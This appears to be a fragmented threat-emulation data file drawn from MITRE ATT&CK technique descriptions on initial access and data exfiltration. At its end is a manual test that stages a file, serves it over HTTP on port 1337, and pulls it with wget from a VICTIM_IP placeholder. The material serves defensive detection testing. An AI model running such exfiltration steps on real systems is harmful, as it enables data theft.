        If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.

        Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)

        For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)

      name: Content Injection
      description: |-
        Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)

        Adversaries may inject content to victim systems in various ways, including:

        * From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)
        * From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)

        Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with "lawful interception."(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)

      description: |-
        Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

        Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)

        Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)

      description: |-
        Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.

        Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)

        In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)

      description: |-
        Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.

        Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., "thread hijacking").(Citation: phishing-krebs)

        Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)

        Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

        In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

        The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)

      description: |-
        Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.

        All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Tools](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)

        Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)

      description: |-
        Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:

        * A legitimate website is compromised, allowing adversaries to inject malicious code
        * Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary
        * Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))
        * Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)

        Browser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking "allow" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)

        Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)

        Typical drive-by compromise process:

        1. A user visits a website that is used to host the adversary controlled content.
        2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.
        3. Upon finding a vulnerable version, exploit code is delivered to the browser.
        4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.

        Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.

        organization for use by users, remote support, services, or for administration
        of resources within a cloud service provider or SaaS application. Cloud Accounts
        can exist solely in the cloud; alternatively, they may be hybrid-joined between
        on-premises systems and the cloud through syncing or federation with other
        identity sources such as Windows Active Directory.(Citation: AWS Identity

        or various other means to gain access to the environment. Federated or synced
        accounts may be a pathway for the adversary to affect both on-premises systems
        and cloud environments - for example, by leveraging shared credentials to
        log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High
        privileged cloud accounts, whether federated, synced, or cloud-only, may also
        allow pivoting to on-premises environments by leveraging SaaS-based [Software
        Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands
        on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional
        Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised
        cloud account to maintain persistence in the environment. Such credentials
        may also be used to bypass security controls such as multi-factor authentication.
        \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)
        or other privileges through various means within the environment. Misconfigurations
        in role assignments or role assumption policies may allow an adversary to
        use these mechanisms to leverage permissions outside the intended scope of
        the account. Such over privileged accounts may be used to harvest sensitive
        data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009)
        or other methods. For example, in Azure environments, adversaries may target
        Azure Managed Identities, which allow associated Azure resources to request
        access tokens. By compromising a resource with an attached Managed Identity,
        such as an Azure VM, adversaries may be able to [Steal Application Access

      name: Spearphishing via Service
      description: "Adversaries may send spearphishing messages via third-party services
        in an attempt to gain access to victim systems. Spearphishing via service
        is a specific variant of spearphishing. It is different from other forms of
        spearphishing in that it employs the use of third party services rather than
        directly via enterprise email channels. \n\nAll forms of spearphishing are
        electronically delivered social engineering targeted at a specific individual,
        company, or industry. In this scenario, adversaries send messages through
        various social media services, personal webmail, and other non-enterprise
        controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services
        are more likely to have a less-strict security policy than an enterprise.
        As with most kinds of spearphishing, the goal is to generate rapport with
        the target or get the target's interest in some way. Adversaries will create
        fake social media accounts and message employees for potential job opportunities.
        Doing so allows a plausible reason for asking about services, policies, and
        software that's running in an environment. The adversary can then send malicious
        links or attachments through these services.\n\nA common example is to build
        rapport with a target via social media, then send content to a personal webmail
        service that the target uses on their work computer. This allows an adversary
        to bypass some email restrictions on the work account, and the target is more
        likely to open the file since it's something they were expecting. If the payload
        doesn't work as expected, the adversary can continue normal communications
        and troubleshoot with the target on how to get it working."

      name: Exfiltration Over Webhook
      description: "Adversaries may exfiltrate data to a webhook endpoint rather than
        over their primary command and control channel. Webhooks are simple mechanisms
        for allowing a server to push data over HTTP/S to a client without the need
        for the client to continuously poll the server.(Citation: RedHat Webhooks)
        Many public and commercial services, such as Discord, Slack, and `webhook.site`,
        support the creation of webhook endpoints that can be used by other services,
        such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When
        changes happen in the linked services (such as pushing a repository update
        or modifying a ticket), these services will automatically post the data to
        the webhook endpoint for use by the consuming application. \n\nAdversaries
        may link an adversary-owned environment to a victim-owned SaaS service to
        achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020)
        of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks
        Repository Webhooks) Alternatively, instead of linking the webhook endpoint
        to a service, an adversary can manually post staged data directly to the URL
        in order to exfiltrate it.(Citation: Microsoft SQL Server)\n\nAccess to webhook
        endpoints is often over HTTPS, which gives the adversary an additional level
        of protection. Exfiltration leveraging webhooks can also blend in with normal
        network traffic if the webhook endpoint points to a commonly used SaaS application
        or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos

        Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device.

For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)

        Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.

      description: "Adversaries may steal data by exfiltrating it over an asymmetrically

        channel. The data may also be sent to an alternate network location from the
        main command and control server. \n\nAsymmetric encryption algorithms are
        those that use different keys on each end of the channel. Also known as public-key
        cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt
        data from the corresponding key. Each end of the communication channels requires
        a private key (only in the procession of that entity) and the public key of
        the other entity. The public keys of each entity are exchanged before encrypted
        communications begin. \n\nNetwork protocols that use asymmetric encryption
        (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged.
        Adversaries may opt to use these encrypted mechanisms that are baked into
        a protocol. "

      description: "Adversaries may steal data by exfiltrating it over an un-encrypted
        network protocol other than that of the existing command and control channel.
        The data may also be sent to an alternate network location from the main command
        and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate
        this data, without the use of encryption, within network protocols that are
        natively unencrypted (such as HTTP, FTP, or DNS). This may include custom
        or publicly available encoding/compression algorithms (such as base64) as
        well as embedding data within protocol headers and fields. "

        A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.

        Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
      supported_platforms:
      - macos
      - linux
      executor:
        steps: |
          1. Victim System Configuration:

              mkdir /tmp/victim-staging-area
              echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt

          2. Using Python to establish a one-line HTTP server on victim system:

              cd /tmp/victim-staging-area
              python -m SimpleHTTPServer 1337

          3. To retrieve the data from an adversary system:

              wget http://VICTIM_IP:1337/victim-file.txt
        name: manual
